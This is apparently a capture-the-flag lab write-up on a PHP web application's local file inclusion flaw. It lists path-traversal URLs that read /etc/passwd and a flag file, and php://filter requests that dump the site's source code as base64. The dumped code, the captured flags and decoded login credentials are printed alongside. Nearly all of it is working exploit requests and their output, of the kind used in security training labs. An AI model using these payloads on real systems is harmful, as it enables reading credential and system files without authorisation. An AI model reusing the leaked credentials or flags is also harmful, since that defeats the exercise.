# LFI

https://10-10-5-41.p.thmlabs.com/index.php?err=../../../../../../../../../../etc/passwd


## flag 1:
https://10-10-5-41.p.thmlabs.com/index.php?err=../../../../../../../../../../etc/flag

THM{d29e08941cf7fe41df55f1a7da6c4c06}

## flag 2:
### read index.php
https://10-10-5-41.p.thmlabs.com/index.php?err=php://filter/convert.base64-encode/resource=index.php

PD9waHAgc2Vzc2lvbl9zdGFydCgpOwokZmxhZyA9ICJUSE17NzkxZDQzZDQ2MDE4YTBkODkzNjFkYmY2MGQ1ZDllYjh9IjsKaW5jbHVkZSgiLi9pbmNsdWRlcy9jcmVkcy5waHAiKTsKaWYoJF9TRVNTSU9OWyd1c2VybmFtZSddID09PSAkVVNFUil7ICAgICAgICAgICAgICAgICAgICAgICAgCgloZWFkZXIoICdMb2NhdGlvbjogbWFuYWdlLnBocCcgKTsKCWRpZSgpOwp9IGVsc2UgewoJJGxhYk51bSA9ICIiOwogIHJlcXVpcmUgIi4vaW5jbHVkZXMvaGVhZGVyLnBocCI7Cj8+CjxkaXYgY2xhc3M9InJvdyI+CiAgPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4KICA8L2Rpdj4KICA8ZGl2IGNsYXNzPSJjb2wtbGctOCBjb2wtb2Zmc2V0LTEiPgogICAgICA8P3BocCBpZiAoaXNzZXQoJGVycm9yKSkgeyA/PgogICAgICAgICAgPHNwYW4gY2xhc3M9InRleHQgdGV4dC1kYW5nZXIiPjxiPjw/cGhwIGVjaG8gJGVycm9yOyA/PjwvYj48L3NwYW4+CiAgICAgIDw/cGhwIH0KCj8+CiA8cD5XZWxjb21lIDw/cGhwIGVjaG8gZ2V0VXNlck5hbWUoKTsgPz48L3A+Cgk8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1kYW5nZXIiIHJvbGU9ImFsZXJ0Ij5UaGlzIHNlcnZlciBoYXMgc2Vuc2l0aXZlIGluZm9ybWF0aW9uLiBOb3RlIEFsbCBhY3Rpb25zIHRvIHRoaXMgc2VydmVyIGFyZSBsb2dnZWQgaW4hPC9kaXY+IAoJPC9kaXY+Cjw/cGhwIGlmKCRlcnJJbmNsdWRlKXsgaW5jbHVkZSgkX0dFVFsnZXJyJ10pO30gPz4KPC9kaXY+Cgo8P3BocAp9Cj8+

### FLAG:
THM{791d43d46018a0d89361dbf60d5d9eb8}


## Credits.php
https://10-10-5-41.p.thmlabs.com/index.php?err=php://filter/convert.base64-encode/resource=./includes/creds.php

PD9waHAgCiRVU0VSID0gIk1jU2tpZHkiOwokUEFTUyA9ICJBMEMzMTVBdzNzMG0iOwo/

$USER = "McSkidy";
$PASS = "A0C315Aw3s0m";

## flag 3
THM{552f313b52e3c3dbf5257d8c6db7f6f1}


## Logs.php

https://10-10-5-41.p.thmlabs.com/index.php?err=php://filter/convert.base64-encode/resource=./logs.php

PD9waHAgCnNlc3Npb25fc3RhcnQoKTsKaW5jbHVkZSgnLi9pbmNsdWRlcy9jcmVkcy5waHAnKTsKCiAgaWYoJF9TRVNTSU9OWyd1c2VybmFtZSddICE9PSAkVVNFUil7CiAgICAgIGhlYWRlcigiTG9jYXRpb246IGxvZ2luLnBocCIpOwogICAgICBkaWUoKTsKICB9IGVsc2UgewoJICAkbGFiTnVtID0gIkxvZ3MiOwoJICByZXF1aXJlICIuL2luY2x1ZGVzL2hlYWRlci5waHAiOwogIH0KPz4KCjxkaXYgY2xhc3M9InJvdyI+CiAgPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4KICAgICAgPD9waHAgaWYgKGlzc2V0KCRlcnJvcikpIHsgPz4KICAgICAgICAgIDxzcGFuIGNsYXNzPSJ0ZXh0IHRleHQtZGFuZ2VyIj48Yj48P3BocCBlY2hvICRlcnJvcjsgPz48L2I+PC9zcGFuPgogICAgICA8P3BocCB9ID8+CiAgICA8cD5IaSA8P3BocCBlY2hvICRfU0VTU0lPTlsndXNlcm5hbWUnXTsgPz48L3A+CjxwPkhlcmUgYXJlIHRoZSBsb2dzIGluIHRoZSBmb2xsb3dpbmcgZm9ybWF0OiA8Y29kZT51c2VyOmlwOlVTRVItQWdlbnQ6UGFnZTwvY29kZT4uIFRoZSBsb2cgZmlsZSBsb2NhdGlvbiBhdDogPGNvZGU+Li9pbmNsdWRlcy9sb2dzL2FwcF9hY2Nlc3MubG9nPC9jb2RlPjxwPgo8YSBocmVmPSJyZXNldC5waHA/cmVzZXQ9PD9waHAgZWNobyAkUEFTUz8+Ij5SZXNldCBMb2dzPC9hPgo8aHI+CjxwcmU+PGNvZGU+Cjw/cGhwIC8vbmNsdWRlKCcuL2luY2x1ZGVzL2xvZ3MvYXBwX2FjY2Vzcy5sb2cnKTsKJGhhbmRsZSA9IGZvcGVuKCJpbmNsdWRlcy9sb2dzL2FwcF9hY2Nlc3MubG9nIiwgInIiKTsKaWYgKCRoYW5kbGUpIHsKICAgIHdoaWxlICgoJGxpbmUgPSBmZ2V0cygkaGFuZGxlKSkgIT09IGZhbHNlKSB7CgkgICAgLy8gcHJvY2VzcyB0aGUgbGluZSByZWFkLgoJICAgIGVjaG8gJGxpbmU7CiAgICB9CgogICAgZmNsb3NlKCRoYW5kbGUpOwp9IGVsc2UgewogICAgLy8gZXJyb3Igb3BlbmluZyB0aGUgZmlsZS4KfSAKCj8+CjwvY29kZT48L3ByZT4K

## header.php

https://10-10-5-41.p.thmlabs.com/index.php?err=php://filter/convert.base64-encode/resource=./includes/header.php
PD9waHAgCgoKPz4KPCFkb2N0eXBlIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT48P3BocCBlY2hvICRsYWJOdW07ID8+PC90aXRsZT4KCgogICAgPCEtLSBCb290c3RyYXAgY29yZSBDU1MgLS0+CiAgICA8bGluayBocmVmPSIuL2Nzcy9ib290c3RyYXAubWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KCiAgICA8IS0tIEN1c3RvbSBTdHlsZXNoZWV0IC0tPgogICAgPGxpbmsgaHJlZj0iLi9jc3Mvc3R5bGUuY3NzIiByZWw9InN0eWxlc2hlZXQiPgoKICAgIDwhLS0gQ29yZSBsaWJyYXJpZXMgYm9vdHN0cmFwICYganF1ZXJ5IC0tPgogICAgPHNjcmlwdCBzcmM9Ii4vanMvYm9vdHN0cmFwNS5taW4uanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9Ii4vanMvanF1ZXJ5LTMuNi4wLm1pbi5qcyI+PC9zY3JpcHQ+CgogICAgPCEtLSBDdXN0b20gSlMgY29kZSAtLT4KICAgIDxzY3JpcHQgc3JjPSIuL2pzL3NjcmlwdC5qcyI+PC9zY3JpcHQ+CgogIDwvaGVhZD4KCiAgICA8aGVhZGVyPgo8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogIDx1bCBjbGFzcz0ibmF2Ij4KICAJPGxpIGNsYXNzPSJuYXYtaXRlbSI+CiAgICAJCTxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iLi9pbmRleC5waHAiPkhvbWU8L2E+Cgk8L2xpPgogICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPgogICAgICAgICAgICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIj4vPC9hPgogICAgICAgIDwvbGk+CiAJPGxpIGNsYXNzPSJuYXYtaXRlbSI+Cgk8YSBjbGFzcz0ibmF2LWxpbmsgYWN0aXZlIiA+PD9waHAgZWNobyAkbGFiTnVtOyA/PjwvYT4KICAgICAgICA8L2xpPgogIDwvdWw+CjwvZGl2PgogICAgPC9oZWFkZXI+Cjxib2R5PgogIDxkaXYgY2xhc3M9ImNvbnRhaW5lciIgc3R5bGU9InBhZGRpbmctdG9wOiA1JTsiPgoJPGltZyBzcmM9Ii4vaW1nL3htYXNfdHJlZS5wbmciIGNsYXNzPSJteC1hdXRvIGQtYmxvY2siIHdpZHRoPSIyMDAiIGhlaWdodD0iMzAwIj4KICAgICAgPGgxIGNsYXNzPSJkaXNwbGF5LTQiPk1jU3lzIENvbnRyb2wgU3lzdGVtPC9oMT4KICAgICAgPHAgY2xhc3M9ImxlYWQiPk5vdGUgZnJvbSBNY1N5cyBDb250cm9sIFN5c3RlbTogVGhlIGFjY2VzcyB0byB0aGlzIHdlYiBhcHAgaXMgbGltaXRlZCEKPGhyIGNsYXNzPSJteS00Ij4KCjxwPjw/cGhwIHdyaXRlTG9ncygpPz48L3A+CgoKPD9waHAgCgkkcGFyYW1ldGVyID0gJF9TRVJWRVJbJ1FVRVJZX1NUUklORyddOwppZihiYXNlbmFtZSgkX1NFUlZFUlsnUEhQX1NFTEYnXSkgPT0gImluZGV4LnBocCIgJiYgc3RybGVuKCRwYXJhbWV0ZXIpID09IDApewoJaGVhZGVyKCdMb2NhdGlvbjogaW5kZXgucGhwP2Vycj1lcnJvci50eHQnKTsKCWRpZSgpOwp9IGVsc2UgewoJaWYoJF9HRVRbJ2VyciddKXsKCQkkZXJySW5jbHVkZSA9IHRydWU7Cgl9Cn0KPz4KPD9waHAKZnVuY3Rpb24gZ2V0VXNlckFnZW50KCl7CiAgJGxvZyA9IGdldFVzZXJOYW1lKCkuJzonIC4kX1NFUlZFUlsnUkVNT1RFX0FERFInXS4nOicuICRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXS4gJzonIC4kX1NFUlZFUlsnUkVRVUVTVF9VUkknXS4gIlxuIjsKcmV0dXJuICRsb2c7Cn0KCmZ1bmN0aW9uIGdldFVzZXJOYW1lKCl7CglpZighaXNzZXQoJF9TRVNTSU9OWyd1c2VybmFtZSddKSl7CgkJJHVzZXJuYW1lID0gIkd1ZXN0IjsKCX0gZWxzZSB7CgkJJHVzZXJuYW1lID0gJF9TRVNTSU9OWyd1c2VybmFtZSddOwoJfQoJcmV0dXJuICR1c2VybmFtZTsKfQoKCmZ1bmN0aW9uIHdyaXRlTG9ncygpewoJCgkkbG9nRmlsZSA9ICIuL2luY2x1ZGVzL2xvZ3MvYXBwX2FjY2Vzcy5sb2ciOwoJJGxvZyA9IGdldFVzZXJBZ2VudCgpOwoJJHdyaXRlciA9IGZvcGVuKCRsb2dGaWxlLCJhKyIpIG9yIGRpZSgiVW5hYmxlIHRvIG9wZW4gZmlsZSEiKTsKCWZ3cml0ZSgkd3JpdGVyLCAkbG9nKTsKCS8vZmNsb3NlKCR3cml0ZXIpOwp9Cgo/

## reset.php
https://10-10-5-41.p.thmlabs.com/index.php?err=php://filter/convert.base64-encode/resource=./reset.php

PD9waHAKc2Vzc2lvbl9zdGFydCgpOwppbmNsdWRlKCcuL2luY2x1ZGVzL2NyZWRzLnBocCcpOwoKICBpZigkX1NFU1NJT05bJ3VzZXJuYW1lJ10gIT09ICRVU0VSKXsKICAgICAgaGVhZGVyKCJMb2NhdGlvbjogbG9naW4ucGhwIik7CiAgICAgIGRpZSgpOwogIH0gZWxzZSB7CiAgICAgICAgICAkbGFiTnVtID0gIlJlc2V0IjsKICAgICAgICAgIHJlcXVpcmUgIi4vaW5jbHVkZXMvaGVhZGVyLnBocCI7CiAgCgkgIGlmKCRfR0VUWydyZXNldCddID09PSAkUEFTUyl7CgkJICBzeXN0ZW0oJ2VjaG8gIiIgPiAuL2luY2x1ZGVzL2xvZ3MvYXBwX2FjY2Vzcy5sb2cnKTsKCQkgIGVjaG8gIkRvbmUhIjsKCSAgfQogIAogIH0KPz4K